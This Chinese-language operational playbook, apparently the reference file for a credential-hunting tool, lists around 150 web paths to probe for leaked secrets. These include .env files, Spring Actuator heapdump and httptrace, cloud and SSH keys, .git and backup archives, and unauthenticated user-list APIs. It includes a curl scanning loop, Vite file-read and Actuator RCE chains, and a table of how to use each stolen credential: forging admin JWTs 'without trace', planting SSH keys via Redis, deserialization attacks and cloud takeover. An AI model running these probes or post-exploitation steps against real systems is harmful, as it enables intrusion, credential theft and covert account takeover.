# 凭据产地矩阵 —— 精确路径 × 实测判据 × 拿到后怎么用

> 全部路径由 `tools/ops/admin_cred_hunter.py` 的 `PATHS` 清单驱动(154 条,分 tier)。
> 铁律: 扫描前先取 **catch-all 基线**,只有长度/状态≠基线的响应才算命中。

## 0. 基线法与分类口诀

```bash
# 1) 基线: 必然不存在的路径
curl -sk -o /tmp/base -w '%{http_code} %{size_download}\n' "https://T/__nodbg_$RANDOM__"
BL=$(wc -c < /tmp/base)
# 2) 只有不等于 BL 的 200 才是候选
for f in .env actuator/env robots.txt; do
  curl -sk -o /tmp/r -w "$f -> %{http_code} " "https://T/$f"
  echo "$(wc -c < /tmp/r)B $([ "$(wc -c < /tmp/r)" -eq "$BL" ] && echo CATCHALL || echo CANDIDATE)"
done
```

| 响应 | 含义 | 动作 |
|---|---|---|
| 401 + 业务文案 | 路由存在、鉴权生效 | 去找凭据 |
| 404 | 路由不存在(或已被 deny) | 别在同 host 继续枚举这条 |
| 200 长度==基线 | **catch-all 兜底页,不是命中** | 剔除 |
| 405 | 路由存在但方法不对 | 换对的方法 |
| 403 | 存在且被刻意保护 | 进路径绕过矩阵 |
| 500 | 参数进了解析器 | **不等于利用成功** |

## 1. tier1 凭据直出面

### 1.1 环境 / 配置
```
/.env /.env.local /.env.production /.env.prod /.env.dev /.env.development
/.env.test /.env.bak /.env.old /.env.example /env
/config.js /config.json /config.yaml /config.yml
/application.yml /application-dev.yml /application-prod.yml /bootstrap.yml
/appsettings.json /appsettings.Production.json /web.config
/wp-config.php.bak /config.php.bak /database.php /settings.py /local_settings.py
/config/global.php /include/config.php /App/Conf/config.php /application/database.php
/api/config /runtime/app-config.js
```
`.env` 实测形态:
```
APP_KEY=base64:<...>
DB_PASSWORD=<db_pass>
JWT_SECRET=<jwt_secret>          ← ★ 拿到即自签 token,免登录且无痕
REDIS_PASSWORD=<redis_pass>
```
**开发服务器 RCE/读文件面(Vite 系)**: `/@fs//proc/self/cwd/.env`(进程工作目录)、
`/@fs//proc/self/environ`(整个环境变量)—— 往往一条就够。类级迁移: 见到 framework dev server
(webpack-dev-server / Vite / Next dev / Astro / Nuxt)就试 `@fs` + `?raw` / `?import` 组合 + 编码变形。

### 1.2 Java 生态(命中率最高)
```
/actuator                    ← 端点索引,一眼看出开了哪些
/actuator/env                ← 明文密码/连接串(★★★)
/actuator/httptrace          ← 最近请求 + Authorization/Cookie 头 = 管理员活 token(★★★ 常被忽略)
/actuator/heapdump           ← 堆转储 → 对象图抽凭据
/actuator/configprops /actuator/mappings /actuator/beans /actuator/threaddump
/actuator/loggers            ← 可调 DEBUG 让后续登录凭据进日志(改配置有痕)
/actuator/logfile /actuator/prometheus /actuator/shutdown
/jolokia/list                ← MBean over HTTP → RCE 面
/druid/index.html /druid/sql.json /druid/weburi.json /druid/datasource.json
/druid/websession.json /druid/spring.json
/swagger-resources /v2/api-docs /v3/api-docs /openapi.json /api-docs /swagger-ui.html /doc.html
```
Spring Actuator 安全模型演变(**判据**):
- 1.0–1.4: 所有端点**免认证**
- 1.5 起: 默认只有 `/health` `/info` 非敏感 —— **但开发者常手动放开全部**
- **CVE-2026-40976(4.0.0–4.0.5)**: 官方默认值本身就漏(缺 `spring-boot-health` 时无 Actuator 授权规则)
利用: `/jolokia` MBean RCE;`/env` 改属性(Spring Cloud 在场时可打 Eureka `serviceURL` 的 XStream 反序列化;
`spring.datasource.tomcat.*` 可改连接串/校验语句);`/env` + H2 组合 RCE;`loggers` 抓登录凭据;
`/env` + H2 = "三步走" RCE(spaceraccoon)。

### 1.3 日志(明文口令 + 活票产地)
```
/storage/logs/laravel.log  /storage/logs/laravel-2.log
/logs/error.log  /logs/app.log  /logs/spring.log  /log/error.log
/runtime/log/  /nohup.out  /app.log  /debug.log  /error.log  /access.log
```
Laravel 实测内容: `[2026-09-01] production.ERROR: login attempt {"user":"admin","pass":"<明文>"}`

### 1.4 云 / 运维
```
/.aws/credentials /.aws/config /.ssh/id_rsa /.ssh/authorized_keys /id_rsa
/.docker/config.json /docker-compose.yml /docker-compose.yaml /Dockerfile
/kubeconfig /.kube/config /terraform.tfstate /.gitlab-ci.yml
/jenkins/config.xml /.npmrc /.pypirc /.bash_history /.zsh_history /.mysql_history
```

## 2. tier2 源码 / 结构 / 备份
```
/.git/HEAD /.git/config /.git/logs/HEAD /.git/COMMIT_EDITMSG /.svn/entries /.svn/wc.db
/package.json /composer.json /composer.lock /requirements.txt /pom.xml /build.gradle
/.idea/workspace.xml /.vscode/settings.json /.DS_Store /robots.txt /sitemap.xml
/phpinfo.php /info.php /test.php /server-status /nginx_status
/web.zip /www.zip /admin.zip /dist.zip /source.zip /code.zip /site.zip
/backup.zip /backup.tar.gz /www.tar.gz /db.sql /dump.sql /backup.sql /1.sql
/wwwroot.rar /admin.rar /backup/ /bak/ /old/ /temp/ /test/ /upload/ /download/ /data/
/.well-known/security.txt
```
**`/.git/config` 是枢纽**: 里面的 `git@<ip>:<ns>/<repo>.git` 指向组织自建 GitLab/Gitea
→ GitLab `/api/v4/projects` 匿名列公开仓库 → 反推组织所有站点。详见 `vcs-repo-exposure`。
⚠️ **`.git*` 是 WAF 高危特征**,命中即按出口 IP 封 30–40 分钟,判定请求放批次最后。
**备份包的正确读法**: 解出 `db.sql` 后**先看 admin 口令的算法**。`$2a$10$` = bcrypt → 放弃跑字典;
无盐 MD5/SHA1 → 值得离线跑。
**固定文件名写入 = 现成信息泄露源**: 源码里出现 `file_put_contents('1.txt', ...)` 这类
固定名、无鉴权调试写入时,立刻去 web 根 GET 同名文件(实测命中长期累积的真实姓名+手机号)。
但 `.txt` 不被解析 ⇒ **通常只是信息泄露,不是 getshell**,别当 RCE 卖点。

## 3. tier3 未授权数据面(直接吐用户表)
```
/prod-api/system/user/list         ← 若依,未授权即吐用户(含 hash)
/system/user/list /api/system/user/list /api/user/list /api/users /users
/api/admin/list /api/v1/users /api/getUserInfo /api/user/getInfo /api/sysUser/list
/api/base/captcha /api/base/login  ← GVA
/metrics /debug/pprof/ /api-docs/swagger.json
```
翻用户表时重点看: `password`(判算法)、`resetPasswordToken`、`phone`(手机号登录 / oracle)、`role`、`status`。

## 4. 前端 JS 挖密
挖什么(正则类别): 键值型密钥 / 配置行密钥 / URL 内嵌凭据 / 对称密钥候选 / 签名算法 /
DB-URI / 云AK / 私钥 / Bearer 令牌 / JWT 实例 / 内网地址 / 内网域名 / 注释里的账号 / 账号字面量 / 隐藏接口。

网络侧工具(有仓库/构建产物时):
```bash
npx trufflehog filesystem ./dist          # 800+ 检测器,支持在线验证
npx trufflehog git <repo> --only-verified
```
**前端 JS 的真实价值不是"藏口令"**,是**硬编码的 appSecret + 签名算法**:
```js
// 实战形态(请求拦截器)
t.headers["x-access-appid"] = appid;
i.timestamp = Date.now();
i.signature = md5( encodeURI( JSON.stringify(i) ) + secret );
```
拿到 appid + secret + 算法 = **可本地复现任意合法请求**。此后网关层不再是障碍。
分享/邀请链接: 免登录分享页前端会自动完成验证并把 token 存进 `localStorage`
(`JSON.parse(localStorage.getItem('share_sessions_v1')).tokens['<shareId>']`)→ 直接当 Bearer 用。

## 5. 拿到凭据之后(交割)

| 拿到 | 立刻做 | 注意 |
|---|---|---|
| `JWT_SECRET` / `secret_key_base` | 本地自签 admin token,改 `sub/role/exp` | ★ 无痕,首选 |
| DB 口令 | 连库查/改 admin 表;或读 session 表伪造会话 | 有痕;先答"能不能恢复" |
| Shiro Base64 密钥 | `ShiroAttack2` rememberMe 反序列化 | 有痕(落 shell) |
| 云 AK/SK | 云资产接管(OSS/RDS/ECS) | 从最小只读动作开始验证 |
| Redis 口令 | 写 SSH key / 读 session | 写盘有痕 |
| `/actuator/httptrace` 里的 Authorization | 直接当管理员用 | token 有 TTL,立刻用 |
| 审计日志里的 ST/JWT | TTL 内换票 | 见 `auditlog-ticket-harvesting` |
| 任意低权 token | 测它能否驱动管理 API | 见 SKILL §3 族1 |
| 用户表里的 `resetPasswordToken` | 直接重置该账号口令 | 有痕且不可逆 |

## 6. 判空纪律(避免自欺)

- `.env` 直读 404 是常态(nginx deny) → 靠 Whoops 异常页 / 日志 / 备份包兜底,**别断言"不存在"**
- 找不到凭据时正确结论是**如实写"未突破"**,不是"大概有"
- 空 403 ≠ 漏洞(可能是 deny 生效)→ 反向价值: 说明这些面存在且被刻意保护,是下一步绕过的靶子
- 继承别人的报告时,把每条"已验证"当**待验证假设**,差分测试是最低成本的证伪手段
  (实战踩过: 宣称的跨租户 IDOR 实测返回 500;宣称存在的 `resetPasswordToken` 字段根本不存在)
